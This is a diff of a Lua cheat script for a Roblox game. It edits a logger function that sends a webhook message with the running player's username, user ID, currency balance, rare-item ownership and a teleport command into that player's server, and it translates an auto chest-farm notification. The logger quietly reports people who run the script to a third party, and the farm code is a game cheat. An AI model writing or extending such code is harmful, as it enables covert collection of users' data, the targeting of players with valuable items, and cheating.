@@ -107,6 +107,9 @@ function PostWebhook(Url, message)
 end
 
 function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
+    local player = game.Players.LocalPlayer
+    local beli = player:FindFirstChild("Data") and player.Data:FindFirstChild("Beli") and player.Data.Beli.Value or 0
+
     local AdminMessage = {
         ["embeds"] = {
             {
@@ -116,17 +119,18 @@ function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
                 ["fields"] = {
                     {
                         ["name"] = "**👤 Username**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["value"] = "```" .. player.Name .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = "**🗿UserID**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
+                        ["value"] = "```" .. player.UserId .. "```",
                         ["inline"] = true
                     },
                     {
-                        ["name"] = "**🗿GameID**",
-                        ["value"] = "```" .. game.PlaceId .. "```",
+                        -- Thay GameID thành Beli
+                        ["name"] = "**💰 Beli**",
+                        ["value"] = "```" .. tostring(beli) .. "```",
                         ["inline"] = false
                     },
                     {
@@ -146,7 +150,9 @@ function AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness)
                     },
                     {
                         ["name"] = "📜Join Code",
-                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
+                        ["value"] = "```lua\n" ..
+                                    "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" ..
+                                    game.JobId .. "')```",
                         ["inline"] = false
                     },
                     {
@@ -978,7 +984,7 @@ spawn(function()
         if getgenv().config.ChestFarm["Start Farm Chest"] then
             game:GetService("StarterGui"):SetCore("SendNotification", {
                 Title = "Auto Chest",
-                Text = "Đang tìm rương...",
+                Text = "Find Chest...",
                 Duration = 3
             })
 
